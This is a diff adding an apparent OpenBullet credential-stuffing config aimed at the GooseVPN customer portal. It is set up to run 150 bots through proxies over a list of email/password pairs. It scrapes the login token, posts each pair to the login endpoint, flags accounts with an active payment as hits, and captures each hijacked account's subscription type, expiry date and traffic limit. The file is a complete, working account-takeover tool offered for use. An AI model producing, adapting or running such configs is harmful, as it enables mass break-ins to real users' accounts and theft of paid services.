@@ -1,0 +1,62 @@
+[SETTINGS]
+{
+  "Name": "GooseVPN",
+  "SuggestedBots": 150,
+  "LastModified": "2019-04-15T18:55:24.8334076+08:00",
+  "AdditionalInfo": "",
+  "Author": "Huffy",
+  "Version": "1.0.1",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://portal.goosevpn.com/clientarea.php?language=english&incorrect=true" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+
+PARSE "<SOURCE>" LR "name=\"token\" value=\"" "\"" -> VAR "token" 
+
+REQUEST POST "https://portal.goosevpn.com/dologin.php" 
+  CONTENT "token=<token>&username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "Referer: https://portal.goosevpn.com/clientarea.php?language=english&incorrect=true" 
+
+KEYCHECK BanOn4XX=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Login Details Incorrect" 
+  KEYCHAIN Success OR 
+    KEY "payment active" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "Expired" 
+    KEY "Reactivate your GOOSE VPN account" 
+
+PARSE "<SOURCE>" LR "Subscriptions</h3>" "payment" -> VAR "subs" 
+
+PARSE "<subs>" LR "class=\"label\">" "</div>" -> CAP "Subscription Type" 
+
+PARSE "<subs>" LR "Active till " "</div>" -> CAP "Expires On" 
+
+PARSE "<SOURCE>" LR "Traffic limit</div>" "label marginTop" -> VAR "Traffic" 
+
+PARSE "<Traffic>" LR "div class=\"status\">" "</div>" -> CAP "Traffic limit" 
+
